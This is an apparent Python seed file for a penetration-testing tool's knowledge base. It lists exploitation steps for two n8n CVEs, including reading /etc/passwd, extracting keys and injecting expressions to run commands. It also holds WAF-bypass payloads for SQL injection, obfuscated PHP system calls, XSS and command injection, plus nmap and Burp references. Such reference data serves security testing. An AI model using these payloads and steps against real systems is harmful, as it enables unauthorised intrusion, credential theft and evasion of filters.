"""VulnClaw Knowledge Updater — update and seed the knowledge base."""

from __future__ import annotations

from vulnclaw.i18n import bi as _rl
from vulnclaw.kb.store import KnowledgeStore


def seed_knowledge_base(store: KnowledgeStore) -> None:
    """Seed the knowledge base with initial data.

    This populates the KB with essential security knowledge for MVP.
    """
    # ── CVE Entries ──────────────────────────────────────────────

    cves = [
        {
            "id": "CVE-2026-21858",
            "title": "n8n Arbitrary File Read via Public Form",
            "description": "n8n versions >= 1.65.0 and < 1.121.0 allow unauthenticated "
            "arbitrary file read through public form submission endpoints when "
            "a workflow contains a Form Ending node returning a binary file.",
            "severity": "Critical",
            "affected": "n8n >= 1.65.0, < 1.121.0",
            "tags": ["n8n", "file-read", "rce", "critical"],
            "exploitation_steps": [
                "Identify a public form path on the n8n instance",
                "Send POST request with forged files object containing filepath",
                "Read server files including /etc/passwd, config, database",
                "Extract encryption key from config",
                "Use extracted credentials to login",
                "Create malicious workflow with expression injection for RCE",
            ],
            "remediation": "Upgrade to n8n >= 1.121.0",
        },
        {
            "id": "CVE-2025-68613",
            "title": "n8n Authenticated Expression Injection RCE",
            "description": "Authenticated expression injection in n8n allows RCE via "
            "malicious workflow expressions.",
            "severity": "Critical",
            "affected": "n8n >= 0.211.0, < 1.120.4",
            "tags": ["n8n", "rce", "expression-injection", "critical"],
            "exploitation_steps": [
                "Login with valid credentials",
                "Create a workflow with manualTrigger + set node",
                "Insert expression payload: ={{ (function(){...execSync(cmd)...})() }}",
                "Run the workflow",
                "Read execution result for command output",
            ],
            "remediation": "Upgrade to n8n >= 1.120.4 or 1.121.1",
        },
    ]

    for cve in cves:
        existing = store.get_entry("cve", cve["id"])
        if not existing:
            store.add_entry("cve", cve["id"], cve)

    # ── Technique Entries ────────────────────────────────────────

    techniques = [
        {
            "id": "sqli-bypass",
            "title": _rl("SQL 注入绕过技巧", "SQL Injection Bypass Techniques"),
            "description": _rl("绕过 WAF 的 SQL 注入 payload 构造方法", "Methods for constructing SQL-injection payloads that bypass a WAF"),
            "tags": ["sqli", "waf-bypass", "web"],
            "bypass_methods": [
                _rl("大小写混合: SeLeCt", "Case mixing: SeLeCt"),
                _rl("内联注释: S/*!ELECT*/", "Inline comments: S/*!ELECT*/"),
                _rl("双重编码: %2565", "Double encoding: %2565"),
                _rl("等价函数: GROUP_CONCAT 替代 concat_ws", "Equivalent functions: GROUP_CONCAT instead of concat_ws"),
            ],
        },
        {
            "id": "sqli-one-pass-playbook",
            "title": _rl("SQL 注入一命通关实战速查", "SQL Injection One-Pass Field Quick Reference"),
            "description": _rl("基于 fushuling 公开文章二次整理的 SQL 注入手工验证、sqlmap 加速、tamper/WAF 绕过与证据记录流程。", "A workflow for manual SQL-injection verification, sqlmap acceleration, tamper/WAF bypass and evidence recording, adapted from fushuling's public article."),
            "source": {
                "title": _rl("SQL注入一命通关!", "SQL Injection One-Pass!"),
                "url": "https://fushuling.com/index.php/2023/04/07/sql%E6%B3%A8%E5%85%A5%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/",
                "published": "2023-04-07",
            },
            "tags": [
                "sqli",
                "sqlmap",
                "tamper",
                "waf-bypass",
                "ctf-web",
                "evidence",
            ],
            "workflow": [
                _rl("先定位真实输入面：HTML 表单、GET/POST 参数、XHR/API、Cookie 或 HTTP 头。", "First locate the real input surface: HTML forms, GET/POST parameters, XHR/API, cookies, or HTTP headers."),
                _rl("建立 baseline，再用 true/false、报错、延迟或 union 回显验证是否进入 SQL 语义层。", "Establish a baseline, then use true/false, errors, delays, or union echo to verify whether input reaches the SQL semantic layer."),
                _rl("联合查询按列数、回显位、库名、表名、列名、数据推进；无回显时切换布尔/时间盲注。", "For union queries, advance through column count, echo position, database name, table name, column name, and data; when there is no echo, switch to boolean/time-based blind injection."),
                _rl("过滤明显时按被拦截 token 选择最小绕过：空白、注释、编码、比较符、关键字形态或自定义 tamper。", "When filtering is obvious, pick the minimal bypass for the blocked token: whitespace, comments, encoding, comparison operators, keyword forms, or a custom tamper."),
                _rl("手工确认参数和响应差异后，再使用 sqlmap 加速枚举或数据提取。", "After manually confirming the parameter and response differences, use sqlmap to accelerate enumeration or data extraction."),
            ],
            "tool_guidance": [
                _rl("单次请求用 fetch。", "Use fetch for a single request."),
                _rl("payload 批量对比用 http_probe_batch。", "Use http_probe_batch to compare payloads in bulk."),
                _rl("盲注循环、复杂编码或响应解析再用 python_execute。", "Use python_execute for blind-injection loops, complex encoding, or response parsing."),
                _rl("发现明确表单或 id 参数时优先测试该入口，不要先做无意义目录扫描。", "When a clear form or id parameter is found, test that entry point first instead of doing pointless directory scanning."),
            ],
            "evidence_required": [
                _rl("URL、HTTP 方法、参数名、baseline 响应摘要。", "URL, HTTP method, parameter name, and baseline response summary."),
                _rl("true/false、error/time 或 union 回显差异。", "true/false, error/time, or union echo differences."),
                _rl("状态码、长度、hash、关键 body 片段或响应时间。", "Status code, length, hash, key body fragments, or response time."),
                _rl("最终 flag/敏感数据必须逐字来自工具输出。", "The final flag/sensitive data must come verbatim from tool output."),
            ],
            "reference_file": "vulnclaw/skills/specialized/secknowledge-skill/references/web-sqli-fushuling-one-pass.md",
        },
        {
            "id": "rce-bypass-php",
            "title": _rl("PHP 命令执行绕过技巧", "PHP Command-Execution Bypass Techniques"),
            "description": _rl("绕过 PHP WAF 的命令执行 payload 构造", "Constructing command-execution payloads that bypass a PHP WAF"),
            "tags": ["rce", "waf-bypass", "php", "web"],
            "bypass_methods": [
                _rl("Base64编码函数名: $f=base64_decode('c3lzdGVt');$f('id');", "Base64-encoded function name: $f=base64_decode('c3lzdGVt');$f('id');"),
                _rl("字符串拼接: $f='sys'.'tem';$f('id');", "String concatenation: $f='sys'.'tem';$f('id');"),
                _rl("拆分路径: '/va'.'r/ww'.'w/ht'.'ml'", "Path splitting: '/va'.'r/ww'.'w/ht'.'ml'"),
                _rl("反转字符串: $f=strrev('metsys');$f('id');", "String reversal: $f=strrev('metsys');$f('id');"),
            ],
        },
        {
            "id": "xss-bypass",
            "title": _rl("XSS 绕过技巧", "XSS Bypass Techniques"),
            "description": _rl("绕过 WAF/XSS 过滤器的 payload 构造", "Constructing payloads that bypass WAF/XSS filters"),
            "tags": ["xss", "waf-bypass", "web"],
            "bypass_methods": [
                _rl("事件处理器: <img src=x onerror=alert(1)>", "Event handlers: <img src=x onerror=alert(1)>"),
                _rl("SVG 标签: <svg onload=alert(1)>", "SVG tags: <svg onload=alert(1)>"),
                _rl("HTML实体编码", "HTML entity encoding"),
                _rl("Unicode 编码", "Unicode encoding"),
            ],
        },
        {
            "id": "cmd-injection-bypass",
            "title": _rl("命令注入绕过技巧", "Command-Injection Bypass Techniques"),
            "description": _rl("绕过命令注入过滤的方法", "Methods for bypassing command-injection filters"),
            "tags": ["command-injection", "waf-bypass", "web"],
            "bypass_methods": [
                _rl("换行符: id\\nwhoami", "Newline: id\\nwhoami"),
                _rl("管道符: id|whoami", "Pipe: id|whoami"),
                _rl("变量拼接: a=i;b=d;$a$b", "Variable concatenation: a=i;b=d;$a$b"),
                _rl("通配符: /bin/ca? /etc/pas?d", "Wildcards: /bin/ca? /etc/pas?d"),
            ],
        },
    ]

    for tech in techniques:
        existing = store.get_entry("techniques", tech["id"])
        if not existing:
            store.add_entry("techniques", tech["id"], tech)

    # ── Tool Guides ──────────────────────────────────────────────

    tools = [
        {
            "id": "nmap",
            "title": _rl("Nmap 端口扫描速查", "Nmap Port-Scanning Quick Reference"),
            "description": _rl("Nmap 常用扫描命令和参数", "Common Nmap scan commands and options"),
            "tags": ["nmap", "recon", "scanning"],
            "commands": [
                _rl("nmap -sV -sC -p- TARGET    # 全端口扫描+版本探测", "nmap -sV -sC -p- TARGET    # full port scan + version detection"),
                _rl("nmap -sS -TOP_PORTS 1000 TARGET   # SYN扫描Top1000端口", "nmap -sS -TOP_PORTS 1000 TARGET   # SYN scan of the top 1000 ports"),
                _rl("nmap --script vuln TARGET   # 漏洞扫描脚本", "nmap --script vuln TARGET   # vulnerability-scan scripts"),
                _rl("nmap -sU -TOP_PORTS 100 TARGET     # UDP扫描", "nmap -sU -TOP_PORTS 100 TARGET     # UDP scan"),
            ],
        },
        {
            "id": "burp",
            "title": _rl("Burp Suite 工作流", "Burp Suite Workflow"),
            "description": _rl("Burp Suite 渗透测试工作流", "Burp Suite penetration-testing workflow"),
            "tags": ["burp", "proxy", "web"],
            "workflow": [
                _rl("配置浏览器代理 → Burp", "Configure the browser proxy -> Burp"),
                _rl("浏览目标站点，收集请求", "Browse the target site and collect requests"),
                _rl("分析请求中的参数和端点", "Analyze the parameters and endpoints in the requests"),
                _rl("使用 Intruder 进行模糊测试", "Use Intruder for fuzzing"),
                _rl("使用 Repeater 手动验证漏洞", "Use Repeater to manually verify vulnerabilities"),
            ],
        },
    ]

    for tool in tools:
        existing = store.get_entry("tools", tool["id"])
        if not existing:
            store.add_entry("tools", tool["id"], tool)
